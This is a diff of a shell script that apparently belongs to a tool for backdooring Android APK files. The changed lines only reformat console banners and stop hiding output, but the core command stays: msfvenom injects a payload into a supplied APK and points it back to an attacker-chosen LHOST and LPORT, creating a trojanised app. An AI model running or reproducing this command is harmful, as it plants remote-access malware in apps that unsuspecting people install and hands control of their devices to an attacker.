@@ -4374,9 +4374,12 @@ crlst
 ;;
 3)
 echo ""
-echo -n "Backdooring your apk with MSfvenom ...."
-$msfvenom -x $apkt -p $payload LHOST=$yourip LPORT=$yourport -o temp/backand.apk >/dev/null 2>&1
-echo "Finished"
+echo "---------Backdooring your apk with MSFVenom-----------"
+echo ""
+$msfvenom -x $apkt -p $payload LHOST=$yourip LPORT=$yourport -o temp/backand.apk
+echo ""
+echo "-----------------------Finished-----------------------"
+echo ""
 if [[ ! -f "temp/backand.apk" ]]
 then
 echo "MSFVenom was unable to embed a payload on your apk"
